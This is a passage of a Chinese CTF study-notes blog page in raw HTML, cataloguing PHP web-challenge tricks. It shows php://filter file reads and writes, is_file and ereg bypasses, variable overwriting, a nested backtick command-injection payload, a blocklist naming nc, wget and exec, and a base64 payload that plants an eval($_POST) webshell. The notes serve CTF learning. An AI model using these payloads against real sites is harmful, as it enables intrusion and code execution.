class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  <span class="comment">//获取一组常量</span></span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    <span class="comment">//获取类名</span></span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); <span class="comment">//获取静态属性</span></span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); <span class="comment">//获取类中的方法</span></span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="call-user-func回调函数"><a href="#call-user-func回调函数" class="headerlink" title="call_user_func回调函数"></a>call_user_func回调函数</h1><ul><li>call_user_func(callback,parameter)：<br>callback：被调用的回调函数，其余参数是回调函数的参数，尝试用hex2bin()作为回调函数（16进制转化为ASCII 字符）</li><li>call_user_func()来调用一个类里面的方法<ul><li><code>call_user_func(array($classname, &#39;say_hello&#39;));</code><br>将调用$calssname类里面的<code>say_hello</code>的方法</li></ul></li></ul><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><ul><li>配合file_put_contents(v3,str);函数 //在需要base64转换的时候</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php&amp;str=......</span></span><br></pre></td></tr></table></figure><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通常使用：</li></ul><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>当ban掉base64的时候，我们还可以用其他编码方式（或者不编码）：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php//可打印字符引用编码</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php//压缩流</span></span><br></pre></td></tr></table></figure><h1 id="is-file-函数"><a href="#is-file-函数" class="headerlink" title="is_file()函数"></a>is_file()函数</h1><ul><li>判断是否为文件</li></ul><h2 id="php伪协议绕过"><a href="#php伪协议绕过" class="headerlink" title="php伪协议绕过"></a>php伪协议绕过</h2><blockquote><p>highlight_file()可以识别php伪协议 is_file()不能识别php伪协议</p></blockquote><h2 id="proc-self-root"><a href="#proc-self-root" class="headerlink" title="/proc/self/root"></a>/proc/self/root</h2><blockquote><p>在linux中/proc/self/root是指向根目录的 也就是如果在命令行中输入 ls /proc/self/root<br>其实显示的内容是根目录下的内容<br>多次重复后绕过is_file</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><h1 id="ereg-截断漏洞"><a href="#ereg-截断漏洞" class="headerlink" title="ereg()截断漏洞"></a>ereg()截断漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: c=a%00778</code>    反转后：c=877=0x36d</p><ul><li>strrev()：<br>反转字符串，常出现在%00截断漏洞中<br>注：%00是一个整体，不会反转成00% </li></ul><h1 id="Exception异常处理类"><a href="#Exception异常处理类" class="headerlink" title="Exception异常处理类"></a>Exception异常处理类</h1><ul><li>和ReflectionClass反射类用法相似，该类中常用的成员函数如下所示：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getMessage</span>()：返回异常的消息内容；</span><br><span class="line"><span class="title function_ invoke__">getCode</span>()：以数字形式返回异常代码；</span><br><span class="line"><span class="title function_ invoke__">getFile</span>()：返回发生异常的文件名；</span><br><span class="line"><span class="title function_ invoke__">getLine</span>()：返回发生错误的代码行号；</span><br><span class="line"><span class="title function_ invoke__">getTrace</span>()：返回 <span class="title function_ invoke__">backtrace</span>() 数组；</span><br><span class="line"><span class="title function_ invoke__">getTraceAsString</span>()：返回已格式化成字符串的、由函数 <span class="title function_ invoke__">getTrace</span>() 函数所产生的信息；</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()：产生异常的字符串信息，它可以重载。注意，该函数最前部是两个下划线。</span><br></pre></td></tr></table></figure><h1 id="FilesystemIterator类读取文件"><a href="#FilesystemIterator类读取文件" class="headerlink" title="FilesystemIterator类读取文件"></a>FilesystemIterator类读取文件</h1><ul><li>FilesystemIterator获取指定目录下的所有文件</li><li>getcwd()函数：获取当前工作目录 返回当前工作目录</li></ul><p><code>FilesystemIterator(getcwd());</code></p><h1 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h1><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//当前运行的文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//本地地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//所在服务器的主机名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//请求页面时HTTP(通信协议)的名称和版本</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//访问页面使用的请求方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//运行文件的所在目录（绝对路径）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//当前请求头中 Accept-Language</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//运行文件的文件名（绝对路径）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>];<span class="comment">//当前运行的脚本的文件、</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];<span class="comment">//URI 用来指定要访问的页面。</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>，http:<span class="comment">//localhost/aaa/ (打开aaa中的index.php)</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>，http:<span class="comment">//localhost/aaa/?p=222 (附带查询)</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/?p=222&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>，http:<span class="comment">//localhost/aaa/index.php?p=222&amp;q=333</span></span><br><span class="line">结果：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] = <span class="string">&quot;p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] = <span class="string">&quot;/aaa/index.php?p=222&amp;q=333&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] = <span class="string">&quot;/aaa/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">由实例可知：</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 获取查询 语句，实例中可知，获取的是?后面的值</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>] 获取 http:<span class="comment">//localhost 后面的值，包括/</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>] 获取当前脚本的路径，如：index.php</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] 当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure><ul><li><code>$_SERVER[&#39;argv&#39;]</code><ul><li><code>$argv</code>：传递给脚本的参数数组</li></ul></li><li>网页模式下：<br><code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code></li></ul><blockquote><p>CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去<br>继续判断query string是否为空，<br>如果不为空把通过+符号分割的字符串转换成php内部的zend_string，<br>然后再把这个zend_string复制到 arr 数组中去。</p></blockquote><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul><li>储存全局作用域中的变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);<span class="comment">//$v1和$v2指向同一地址，此时$v1=$v2</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: v1=ctfshow&amp;v2=GLOBALS  //构成$GLOBALS</code></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><ul><li>返回由所有已定义变量所组成的数组</li><li>变量包括环境变量、服务器变量和用户定义的变量</li></ul><p><code>var_dump(get_defined_vars())</code></p><h2 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h2><ul><li>PHP变量命名规则：<br>只能包含：字母、数字、下划线<br>其中，只能以字母、下划线开头</li></ul><p><code>if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;</code></p><p>php变量命名不允许出现 .（点号）,需要绕过’CTF_SHOW.COM’</p><p>GET或POST方式传进去的变量名,会自动将<code>空格 + . [</code>转换为 _</p><p>特殊字符<code>[</code>, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了 因此：</p><p><code>CTF[SHOW.COM =&gt; CTF_SHOW.COM</code></p><h1 id="die-和exit-死亡绕过"><a href="#die-和exit-死亡绕过" class="headerlink" title="die()和exit()死亡绕过"></a>die()和exit()死亡绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>PHP在解码base64时，遇到不在其中的字符时，会选择跳过这些字符，将有效的字符重新组成字符串进行解码</p><p>由于死亡之exit中的代码，字符<code>&lt;、?、;、&gt;、</code>空格等字符不符合base64解码范围，最终解码符合要求的只有<code>phpexit</code>这7个字符，而base64在解码的时候，是4个字节一组，因此还少一个，所以我们将这一个添加上去</p><ul><li>base64编码绕过：</li></ul><p><code>?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>什么是变量覆盖？</p><ul><li>用我们的传参值替换程序原有的变量值</li></ul><p>常见场景：</p><blockquote><p>$$使用不当</p><p>extract()函数使用不当</p><p>parse_str()使用不当</p><p>import_request_variables()使用不当</p><p>开启全局变量</p><p>……</p></blockquote><h2 id="与foreach"><a href="#与foreach" class="headerlink" title="$$与foreach()"></a>$$与foreach()</h2><ul><li>$$就是将之前定义的变量的值重新定义新的变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=b</span><br><span class="line"><span class="variable">$b</span>=c</span><br><span class="line">    </span><br><span class="line"><span class="variable">$$a</span> = $(<span class="variable">$a</span>) = <span class="variable">$b</span> = c</span><br></pre></td></tr></table></figure><ul><li>foreach()：循环用于列举出集合中所有的元素（是集合不是数组）</li><li>addslashes()：使用反斜线引用字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>)<span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)&#123;</span><br><span class="line">        <span class="variable">$$_key</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">当我以get方式传入a=<span class="number">2</span>时，输出结果为<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><ul><li>extract(array,extract_rules,prefix) ：将数组中的变量导入到当前的符号表<ul><li>array：必需的，规定要使用的数组</li><li>extract_rules：可有可无，如果为空，则默认为EXTR_OVERWRITE</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;Dog&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a=<span class="subst">$a</span>,\$b=<span class="subst">$b</span>,\$c=<span class="subst">$c</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">结果：<span class="variable">$a</span>=Cat,<span class="variable">$b</span>=Dog,<span class="variable">$c</span>=Horse</span><br></pre></td></tr></table></figure><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><ul><li>把查询字符串解析到变量中</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure><ul><li>若要post参数，需加引号<br><code>v1=&#39;flag=0&#39;</code></li><li><code>parse_str(string $encoded_string [, array &amp;$result ])</code><ul><li>如果存在第二个变量，变量会以数组元素的形式存入到这个数组，作为替代</li></ul></li></ul><blockquote><p>经过parse_str($_SERVER[‘QUERY_STRING’]) \==&gt; $_POST[key1]=36d 数组形式<br>经过extract($_POST)==&gt; $key=36d</p></blockquote><h1 id="assert-断言"><a href="#assert-断言" class="headerlink" title="assert()断言"></a>assert()断言</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() 断言：</span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line">如果 assertion 是字符串，它将会被 <span class="title function_ invoke__">assert</span>() 当做 PHP 代码来执行</span><br><span class="line">可见，<span class="keyword">eval</span>和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加</span><br></pre></td></tr></table></figure><h1 id="gettext拓展"><a href="#gettext拓展" class="headerlink" title="gettext拓展"></a>gettext拓展</h1><p>在开启该拓展后 _() 等效于 gettext()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>); </span><br><span class="line">结果  phpinfo</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>); </span><br><span class="line">结果 phpinfo </span><br></pre></td></tr></table></figure><h1 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>套娃命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=`<span class="variable">$F</span> `;sleep <span class="number">3</span></span><br><span class="line">经过<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  `<span class="variable">$F</span> `;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span> `;&quot;</span>);</span><br><span class="line">我们把原来的<span class="variable">$F</span>带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``<span class="subst">$F</span> `;sleep 3`&quot;</span>); <span class="comment">//``是shell_exec()函数的缩写</span></span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br></pre></td></tr></table></figure><h1 id="nl、cp、mv、tee写文件"><a href="#nl、cp、mv、tee写文件" class="headerlink" title="nl、cp、mv、tee写文件"></a>nl、cp、mv、tee写文件</h1><p>在禁命令的时候没有限制写文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 